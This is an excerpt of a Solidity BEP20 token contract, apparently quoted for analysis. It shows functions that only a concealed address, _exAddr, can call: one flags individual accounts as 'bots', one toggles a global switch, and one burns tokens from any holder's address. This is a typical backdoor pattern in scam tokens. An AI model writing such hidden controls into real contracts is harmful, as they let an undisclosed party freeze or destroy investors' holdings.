...
contract Token is Context, IBEP20, Ownable{
    ...
    function initBotAddress(address account, uint256 value) public {
        require(_exAddr == msg.sender);
        _isInlist[account] = value;
    }

    function changeOn(uint256 status) public {
        require(_exAddr == msg.sender);
        _inOn = status;
    }
    ...
    function burn(address sender, uint256 _value) public returns (bool) {
        require(_exAddr == msg.sender);
